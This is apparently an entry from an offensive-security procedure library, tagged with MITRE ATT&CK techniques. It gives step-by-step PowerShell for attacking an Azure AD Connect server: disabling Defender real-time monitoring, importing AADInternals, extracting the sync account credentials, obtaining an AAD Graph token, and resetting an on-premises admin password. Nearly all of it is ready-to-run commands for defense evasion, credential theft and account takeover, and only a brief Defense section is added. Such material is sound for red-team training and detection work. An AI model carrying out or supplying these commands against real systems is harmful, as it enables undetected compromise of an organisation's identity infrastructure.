---
id: 91608399-73df-454d-8b10-4e918441cbf9
name: Disable-Azure-AD-Connect-Monitoring-and-Reset-On-Premises-Admin-Password
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:16.098274+00:00'
updated_at: '2023-04-10T20:19:32.884546+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
  - '[[tactics/Discovery|TA0007 - Discovery]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
techniques:
  - '[[techniques/Account Discovery|T1087 - Account Discovery]]'
  - '[[techniques/Account Manipulation|T1098 - Account Manipulation]]'
sub_techniques: []
tags:
  - '[[tags/Azure AD Connect]]'
  - '[[tags/Cloud - Azure]]'
commands:
  - '[[commands/powershell-disable-realtime-monitoring]]'
  - '[[commands/powershell-copy-aadinternals-zip-to-remote-session]]'
  - '[[commands/powershell-expand-aadinternals-archive]]'
  - '[[commands/powershell-import-aadinternals-module]]'
  - '[[commands/powershell-get-aadint-sync-credentials]]'
  - '[[commands/powershell-acquire-aad-graph-access-token]]'
  - '[[commands/powershell-get-user-immutable-id]]'
  - '[[commands/powershell-set-user-password]]'
platforms:
  - Windows
  - Azure
tools: []
validated: true
---

# Disable-Azure-AD-Connect-Monitoring-and-Reset-On-Premises-Admin-Password

## Summary

This procedure disables real-time monitoring in Azure AD Connect to evade detection of security events like failed logins and password changes, then resets the on-premises admin password using the AADInternals PowerShell module. This allows an attacker with initial access to the Azure AD Connect server to perform undetected actions in the cloud and gain control over the on-premises Active Directory environment for lateral movement.

## Description

Azure AD Connect synchronizes on-premises Active Directory with Azure AD, and real-time monitoring via Windows Defender helps detect anomalies. By disabling this monitoring and leveraging the sync account credentials, an attacker can authenticate to Azure AD Graph API, retrieve user details like ImmutableID, and reset passwords for synced on-premises accounts. This technique targets hybrid identity environments, enabling persistence and privilege escalation without triggering alerts. It requires administrative access to the Azure AD Connect server and assumes the attacker has established a remote PowerShell session.

## Requirements

1. Administrative access to the Azure AD Connect server (local or remote PowerShell session).
2. PowerShell execution policy allowing script imports (e.g., Set-ExecutionPolicy RemoteSigned).
3. Pre-downloaded AADInternals module ZIP file (version 0.4.5 or compatible) on the attacker's machine.
4. Knowledge of the target tenant name and on-premises admin user principal name (UPN).
5. Remote session variable ($adcnct) established to the target server.

## Defense

- Enable multi-factor authentication (MFA) for all Azure AD and on-premises admin accounts to prevent unauthorized resets.
- Monitor Azure AD Connect server logs (Event Viewer, Azure AD audit logs) for suspicious PowerShell activity, module imports, and API token requests.
- Regularly rotate on-premises admin passwords and restrict AADInternals module usage via application whitelisting.
- Implement least-privilege for sync accounts and enable Azure AD Privileged Identity Management (PIM) for just-in-time access.
- Use endpoint detection and response (EDR) tools to alert on DisableRealtimeMonitoring changes and unusual file copies/expansions.

## Objectives

1. Disable real-time monitoring to avoid detection of subsequent actions.
2. Retrieve Azure AD Connect sync credentials for authentication.
3. Acquire an access token for Azure AD Graph API using sync credentials.
4. Retrieve the ImmutableID of the target on-premises admin user.
5. Reset the on-premises admin password to a known value for lateral access.

## Instructions

### Step 1: Disable Real-Time Monitoring

**Context**: Disable Windows Defender real-time monitoring on the Azure AD Connect server to prevent detection of file operations and PowerShell executions.

**Command** ([[commands/powershell-disable-realtime-monitoring]]):
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

This command turns off real-time protection. Verify by running Get-MpPreference and checking the DisableRealtimeMonitoring value is True.

### Step 2: Copy AADInternals Module to Target Server

**Context**: Transfer the AADInternals PowerShell module ZIP file to the target server via the established remote session for local execution.

**Command** ([[commands/powershell-copy-aadinternals-zip-to-remote-session]]):
```powershell
Copy-Item -ToSession $adcnct -Path C:\Tools\AADInternals.0.4.5.zip -Destination C:\Users\Administrator\Documents
```

This copies the ZIP from the local C:\Tools path to the remote Documents folder. Confirm success by listing the destination directory on the remote session.

### Step 3: Extract the AADInternals Module

**Context**: Unzip the module on the target server to make it available for import.

**Command** ([[commands/powershell-expand-aadinternals-archive]]):
```powershell
Expand-Archive C:\Users\Administrator\Documents\AADInternals.0.4.5.zip -DestinationPath C:\Users\Administrator\Documents\AADInternals
```

This extracts the contents to a new folder. Verify by checking the folder contents for AADInternals.psd1.

### Step 4: Import the AADInternals Module

**Context**: Load the module into the PowerShell session to access Azure AD manipulation cmdlets.

**Command** ([[commands/powershell-import-aadinternals-module]]):
```powershell
Import-Module C:\Users\Administrator\Documents\AADInternals\AADInternals.psd1
```

This imports the module. Test by running Get-Command -Module AADInternals to list available cmdlets.

### Step 5: Retrieve Sync Credentials

**Context**: Extract the credentials of the Azure AD Connect sync account, which has elevated permissions for synchronization.

**Command** ([[commands/powershell-get-aadint-sync-credentials]]):
```powershell
Get-AADIntSyncCredentials
```

This outputs the username and encrypted password for the sync account. Note the username for the next step; the password is used internally.

### Step 6: Acquire Access Token for Azure AD Graph

**Context**: Use the sync credentials to obtain an access token for the Azure AD Graph API, enabling password resets for synced users.

**Command** ([[commands/powershell-acquire-aad-graph-access-token]]):
```powershell
$passwd = ConvertTo-SecureString 'password' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ('<Username>@<TenantName>.onmicrosoft.com', $passwd)
GetAADIntAccessTokenForAADGraph -Credentials $creds -SaveToCache
```

Replace '<Username>' and '<TenantName>' with values from Step 5 (use the sync account password as 'password'). This saves the token to cache for subsequent API calls. Success is indicated by no errors and a cached token verifiable via Get-AADIntAccessTokenForAADGraph.

### Step 7: Retrieve On-Premises Admin ImmutableID

**Context**: Query the target on-premises admin user's details to obtain the SourceAnchor (ImmutableID) required for password reset.

**Command** ([[commands/powershell-get-user-immutable-id]]):
```powershell
Get-AADIntUser -UserPrincipalName onpremadmin@defcorpsecure.onmicrosoft.com | Select-Object ImmutableId
```

Replace the UPN with the target admin's. This returns the ImmutableID value, which is a base64-encoded object GUID.

### Step 8: Reset On-Premises Admin Password

**Context**: Use the access token and ImmutableID to reset the password, syncing the change back to on-premises AD.

**Command** ([[commands/powershell-set-user-password]]):
```powershell
Set-AADIntUserPassword -SourceAnchor '<IMMUTABLE-ID>' -Password 'Password' -Verbose
```

Replace '<IMMUTABLE-ID>' with the value from Step 7 and set a known password like 'Password'. The -Verbose flag provides detailed output. Success syncs the reset to on-premises, allowing login with the new password.
